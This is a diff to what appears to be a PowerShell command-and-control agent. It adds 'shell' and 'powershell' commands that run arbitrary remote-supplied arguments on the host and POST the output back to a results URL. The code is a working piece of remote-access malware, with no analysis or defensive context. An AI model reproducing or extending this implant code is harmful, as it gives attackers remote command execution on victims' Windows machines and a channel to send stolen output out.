@@ -36,6 +36,20 @@ for (;;) {
             (Invoke-WebRequest -UseBasicParsing -Uri $resulturl -Body $data -Method 'POST')
             exit
         }
+        elseif ($command -eq "shell"){
+            $arg = "/c "
+            foreach ($a in $args){ $arg += $a + " "}
+            $res = cmd $arg
+            $data = @{result = "$res"}
+            (Invoke-WebRequest -UseBasicParsing -Uri $resulturl -Body $data -Method 'POST')
+        }
+        elseif ($command -eq "powershell"){
+            $arg = ""
+            foreach ($a in $args){ $arg += $a + " "}
+            $res = powershell $arg
+            $data = @{result = "$res"}
+            (Invoke-WebRequest -UseBasicParsing -Uri $resulturl -Body $data -Method 'POST')
+        }
     }
     sleep $sleeptime
 }
